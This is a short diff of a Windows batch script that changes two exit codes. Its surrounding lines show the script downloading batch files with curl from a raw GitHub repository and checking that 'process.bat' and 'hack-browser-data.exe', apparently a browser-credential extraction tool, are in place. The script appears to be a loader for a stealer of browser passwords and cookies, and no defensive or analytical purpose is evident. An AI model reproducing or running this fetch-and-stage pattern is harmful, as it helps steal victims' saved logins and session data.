@@ -20,11 +20,11 @@ curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bi
 REM Verify downloads
 if not exist "process.bat" (
     echo Failed to download process.bat
-    exit /b 1
+    exit /b 4
 )
 if not exist "hack-browser-data.exe" (
     echo Failed to download hack-browser-data.exe
-    exit /b 1
+    exit /b 4
 )
 
 REM Create running flag
